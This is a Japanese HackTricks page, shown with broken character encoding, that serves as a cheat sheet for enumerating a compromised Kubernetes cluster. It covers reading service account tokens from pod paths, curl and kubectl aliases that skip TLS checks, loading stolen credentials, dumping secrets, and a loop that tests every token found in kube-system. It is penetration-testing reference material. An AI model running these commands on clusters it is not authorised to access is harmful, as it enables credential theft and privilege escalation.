# Kubernetesåˆ—æŒ™

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## Kubernetesãƒˆãƒ¼ã‚¯ãƒ³

ãƒã‚·ãƒ³ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒä¾µå®³ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã„ãã¤ã‹ã®Kubernetesãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãƒˆãƒ¼ã‚¯ãƒ³ã¯é€šå¸¸ã€**ç’°å¢ƒå¤‰æ•°`KUBECONFIG`**ãŒæŒ‡ã™ãƒ•ã‚¡ã‚¤ãƒ«ã¾ãŸã¯**`~/.kube`**å†…ã«ã‚ã‚Šã¾ã™ã€‚

ã“ã®ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã«ã¯ã€**APIã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã™ã‚‹ãŸã‚ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¨æ§‹æˆ**ãŒå«ã¾ã‚Œã‚‹æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã«ã¯ä»¥å‰ã«å–å¾—ã—ãŸæƒ…å ±ãŒå«ã¾ã‚Œã‚‹ã‚­ãƒ£ãƒƒã‚·ãƒ¥ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã‚‚ã‚ã‚Šã¾ã™ã€‚

Kubernetesç’°å¢ƒå†…ã®PodãŒä¾µå®³ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ç¾åœ¨ã®K8ç’°å¢ƒã«é–¢ã™ã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã‚„æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ä»–ã®å ´æ‰€ãŒã‚ã‚Šã¾ã™ã€‚

### ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³

ç¶šè¡Œã™ã‚‹å‰ã«ã€Kubernetesã®ã‚µãƒ¼ãƒ“ã‚¹ãŒä½•ã‹ã‚’çŸ¥ã‚‰ãªã„å ´åˆã¯ã€**ã“ã®ãƒªãƒ³ã‚¯ã«å¾“ã£ã¦Kubernetesã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å°‘ãªãã¨ã‚‚èª­ã‚“ã§ãã ã•ã„ã€‚**

Kubernetesã®[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)ã‹ã‚‰ï¼š

_ã€ŒPodã‚’ä½œæˆã™ã‚‹ã¨ãã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’æŒ‡å®šã—ãªã„å ´åˆã€åŒã˜åå‰ç©ºé–“ã®_ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆ_ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒè‡ªå‹•çš„ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™ã€‚ã€_

**ServiceAccount**ã¯Kubernetesã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã€ãƒãƒƒãƒ‰ã§å®Ÿè¡Œã•ã‚Œã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚\
ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã¯ãã‚Œã«é–¢é€£ã™ã‚‹ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆãŒã‚ã‚Šã€ã“ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã«ã¯ãƒ™ã‚¢ãƒ©ãƒ¼ãƒˆãƒ¼ã‚¯ãƒ³ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯JSON Web Tokenï¼ˆJWTï¼‰ã§ã‚ã‚Šã€2ã¤ã®å½“äº‹è€…é–“ã§å®‰å…¨ã«ã‚¯ãƒ¬ãƒ¼ãƒ ã‚’è¡¨ç¾ã™ã‚‹ãŸã‚ã®æ–¹æ³•ã§ã™ã€‚

é€šå¸¸ã€æ¬¡ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®**ã„ãšã‚Œã‹**ï¼š

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

ã«ã¯æ¬¡ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ï¼š

* **ca.crt**ï¼šKubernetesé€šä¿¡ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã®CAè¨¼æ˜æ›¸ã§ã™
* **namespace**ï¼šç¾åœ¨ã®åå‰ç©ºé–“ã‚’ç¤ºã—ã¾ã™
* **token**ï¼šç¾åœ¨ã®ãƒãƒƒãƒ‰ã®**ã‚µãƒ¼ãƒ“ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³**ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ãŸã‚‰ã€APIã‚µãƒ¼ãƒãƒ¼ã¯ç’°å¢ƒå¤‰æ•°**`KUBECONFIG`**å†…ã«è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€`(env | set) | grep -i "kuber|kube`**`"`**ã‚’å®Ÿè¡Œã—ã¦ãã ã•ã„ã€‚

ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€**sa.key**ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚ˆã£ã¦ç½²åã•ã‚Œã€**sa.pub**ã«ã‚ˆã£ã¦æ¤œè¨¼ã•ã‚Œã¾ã™ã€‚

**Kubernetes**ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®å ´æ‰€ï¼š

* /etc/kubernetes/pki

**Minikube**ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®å ´æ‰€ï¼š

* /var/lib/localkube/certs

### ãƒ›ãƒƒãƒˆãƒãƒƒãƒ‰

_**ãƒ›ãƒƒãƒˆãƒãƒƒãƒ‰**_ã¯ç‰¹æ¨©ä»˜ãã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’å«ã‚€ãƒãƒƒãƒ‰ã§ã™ã€‚ç‰¹æ¨©ä»˜ãã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ãƒªã‚¹ãƒˆè¡¨ç¤ºã€ãƒãƒƒãƒ‰ã®ä½œæˆãªã©ã®ç‰¹æ¨©ä»˜ãã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã™ã‚‹æ¨©é™ã‚’æŒã¤ãƒˆãƒ¼ã‚¯ãƒ³ã§ã™ã€‚

## RBAC

**RBAC**ãŒä½•ã‹ã‚ã‹ã‚‰ãªã„å ´åˆã¯ã€**ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³**ã‚’èª­ã‚“ã§ãã ã•ã„ã€‚

## åˆ—æŒ™ãƒãƒ¼ãƒˆã‚·ãƒ¼ãƒˆ

K8sç’°å¢ƒã‚’åˆ—æŒ™ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚‚ã®ãŒå¿…è¦ã§ã™ï¼š

* **æœ‰åŠ¹ãªèªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³**ã€‚å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒˆãƒ¼ã‚¯ãƒ³ã¨ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œç´¢ã™ã‚‹å ´æ‰€ã‚’è¦‹ã¾ã—ãŸã€‚
* Kubernetes APIã®**ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆ_**https://host:port**_**ï¼‰**ã€‚ã“ã‚Œã¯é€šå¸¸ã€ç’°å¢ƒå¤‰æ•°ã‚„kubeæ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã«è¦‹ã¤ã‹ã‚Šã¾ã™ã€‚
* **ã‚ªãƒ—ã‚·ãƒ§ãƒ³**: **APIã‚µãƒ¼ãƒãƒ¼ã‚’æ¤œè¨¼ã™ã‚‹ãŸã‚ã®ca.crt**ã€‚ãƒˆãƒ¼ã‚¯ãƒ³ãŒè¦‹ã¤ã‹ã‚‹å ´æ‰€ã¨åŒã˜å ´æ‰€ã«ã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯APIã‚µãƒ¼ãƒãƒ¼è¨¼æ˜æ›¸ã‚’æ¤œè¨¼ã™ã‚‹ãŸã‚ã«å½¹ç«‹ã¡ã¾ã™ãŒã€`kubectl`ã§`--insecure-skip-tls-verify`ã‚’ä½¿ç”¨ã™ã‚‹ã‹ã€`curl`ã§`-k`ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã“ã‚Œã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ã€‚

ã“ã‚Œã‚‰ã®è©³ç´°ãŒã‚ã‚Œã°ã€Kubernetesã‚’**åˆ—æŒ™**ã§ãã¾ã™ã€‚ä½•ã‚‰ã‹ã®ç†ç”±ã§**API**ãŒ**ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆ**çµŒç”±ã§**ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ãªå ´åˆã€ãã®æƒ…å ±ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ãƒ›ã‚¹ãƒˆã‹ã‚‰ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚’åˆ—æŒ™ã§ãã¾ã™ã€‚

ãŸã ã—ã€é€šå¸¸ã¯**APIã‚µãƒ¼ãƒãƒ¼ã¯å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«å­˜åœ¨**ã™ã‚‹ãŸã‚ã€ä¾µå®³ã•ã‚ŒãŸãƒã‚·ãƒ³ã‚’ä»‹ã—ã¦ãƒˆãƒ³ãƒãƒ«ã‚’ä½œæˆã—ã¦ãƒã‚·ãƒ³ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã‹ã€[**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)ãƒã‚¤ãƒŠãƒªã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã‹ã€`curl/wget/anything`ã‚’ä½¿ç”¨ã—ã¦APIã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã—ã¦ç”Ÿã®HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### `list`ã¨`get`å‹•è©ã®é•ã„

**`get`**æ¨©é™ã‚’æŒã¤ã¨ã€ç‰¹å®šã®ã‚¢ã‚»ãƒƒãƒˆã®æƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼ˆ`kubectl`ã®`describe`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ï¼‰ã€‚
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
ã‚‚ã—**`list`**æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ç‰¹å®šã®ç¨®é¡ã®ã‚¢ã‚»ãƒƒãƒˆã‚’ãƒªã‚¹ãƒˆã™ã‚‹ãŸã‚ã®APIãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒè¨±å¯ã•ã‚Œã¾ã™ï¼ˆ_`kubectl`_ã®`get`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ï¼‰ã€‚
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
ã‚‚ã—**`watch`**æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ã‚¢ã‚»ãƒƒãƒˆã‚’ç›£è¦–ã™ã‚‹ãŸã‚ã®APIãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒè¨±å¯ã•ã‚Œã¾ã™:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
å½¼ã‚‰ã¯ã€Deploymentã®å®Œå…¨ãªãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆã‚’è¿”ã™ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°æ¥ç¶šã‚’é–‹ãã¾ã™ï¼ˆå¤‰æ›´ã•ã‚Œã‚‹ãŸã³ã«ã€ã¾ãŸã¯æ–°ã—ã„ã‚‚ã®ãŒä½œæˆã•ã‚ŒãŸã¨ãï¼‰ã€‚

{% hint style="danger" %}
æ¬¡ã®`kubectl`ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒªã‚¹ãƒˆã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„å ´åˆã¯ã€`get`ã®ä»£ã‚ã‚Šã«`describe`ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

### curlã‚’ä½¿ç”¨

ãƒãƒƒãƒ‰å†…ã‹ã‚‰ã€ã„ãã¤ã‹ã®ç’°å¢ƒå¤‰æ•°ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ãƒãƒƒãƒ‰ã¯ãƒ‰ãƒ¡ã‚¤ãƒ³å`kubernetes.default.svc`ã§**kube-apiã‚µãƒ¼ãƒãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã€`/etc/resolv.config`ã§kubeãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’ç¢ºèªã§ãã¾ã™ï¼ˆåŒã˜ç¯„å›²ã®".1"ãŒkube-apiã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã§ã™ï¼‰ã€‚

### kubectlã®ä½¿ç”¨

ãƒˆãƒ¼ã‚¯ãƒ³ã¨APIã‚µãƒ¼ãƒãƒ¼ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ä»¥ä¸‹ã«ç¤ºã™ã‚ˆã†ã«kubectlã¾ãŸã¯curlã‚’ä½¿ç”¨ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼š

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€APISERVERã¯`https://`ã‚¹ã‚­ãƒ¼ãƒã§é€šä¿¡ã—ã¦ã„ã¾ã™
{% endhint %}
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> ã‚‚ã—urlã«`https://`ãŒãªã„å ´åˆã€Bad Requestã®ã‚ˆã†ãªã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

å…¬å¼ã®kubectlãƒãƒ¼ãƒˆã‚·ãƒ¼ãƒˆã¯[ã“ã¡ã‚‰](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®ç›®æ¨™ã¯ã€å–å¾—ã—ãŸæ–°ã—ã„K8sã‚’åˆ—æŒ™ã—ç†è§£ã™ã‚‹ãŸã‚ã®ç•°ãªã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æ•´ç†ã•ã‚ŒãŸæ–¹æ³•ã§æç¤ºã™ã‚‹ã“ã¨ã§ã™ã€‚

`kubectl`ãŒé€ä¿¡ã™ã‚‹HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã«ã¯ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿`-v=8`ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

#### MitM kubectl - kubectlã®ãƒ—ãƒ­ã‚­ã‚·åŒ–
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### ç¾åœ¨ã®æ§‹æˆ

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è³‡æ ¼æƒ…å ±ã‚’ç›—ã‚€ã“ã¨ãŒã§ããŸå ´åˆã€æ¬¡ã®ã‚ˆã†ãªæ–¹æ³•ã§**ãƒ­ãƒ¼ã‚«ãƒ«ã«è¨­å®š**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ãƒªã‚½ãƒ¼ã‚¹ã®å–å¾—

ã“ã®æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒªã‚¹ãƒˆã§ãã‚‹ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ãŒã‚ã‹ã‚Šã¾ã™

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### ç¾åœ¨ã®æ¨©é™ã‚’å–å¾—ã™ã‚‹

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

ç‰¹æ¨©ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹åˆ¥ã®æ–¹æ³•ã¯ã€æ¬¡ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

**Kubernetes RBAC**ã«ã¤ã„ã¦è©³ã—ãå­¦ã¶ã“ã¨ãŒã§ãã¾ã™:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**ã©ã®ç‰¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹ã‹**ã‚’çŸ¥ã£ãŸã‚‰ã€æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€**ãã‚Œã‚‰ã‚’æ‚ªç”¨ã—ã¦ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹**ã‚’ç¢ºèªã—ã¦ãã ã•ã„:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### ä»–ã®ãƒ­ãƒ¼ãƒ«ã‚’å–å¾—
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
### ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã®å–å¾—

Kubernetesã¯ã€åŒã˜ç‰©ç†ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã‚’ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã¨ã™ã‚‹è¤‡æ•°ã®ä»®æƒ³ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ä»®æƒ³ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã¯**ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹**ã¨å‘¼ã°ã‚Œã¾ã™ã€‚
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®å–å¾—

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã‚€ã“ã¨ãŒã§ãã‚‹å ´åˆã€æ¬¡ã®è¡Œã‚’ä½¿ç”¨ã—ã¦ã€å„ãƒˆãƒ¼ã‚¯ãƒ³ã«é–¢é€£ã™ã‚‹ç‰¹æ¨©ã‚’å–å¾—ã§ãã¾ã™:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®å–å¾—

ã“ã®ãƒšãƒ¼ã‚¸ã®å†’é ­ã§è­°è«–ã•ã‚ŒãŸã‚ˆã†ã«ã€**ãƒãƒƒãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ãã«é€šå¸¸ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™**ã€‚ã—ãŸãŒã£ã¦ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã€ãã®æ¨©é™ã€ãŠã‚ˆã³å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´æ‰€ã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹ã“ã¨ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆã®å–å¾—

ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆã¯ã€å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹**ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆ**ã‚’æŒ‡å®šã—ã¾ã™ã€‚
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### ãƒãƒƒãƒ‰ã®å–å¾—

ãƒãƒƒãƒ‰ã¯å®Ÿéš›ã«å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ³ãƒ†ãƒŠã§ã™ã€‚
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### ã‚µãƒ¼ãƒ“ã‚¹ã®å–å¾—

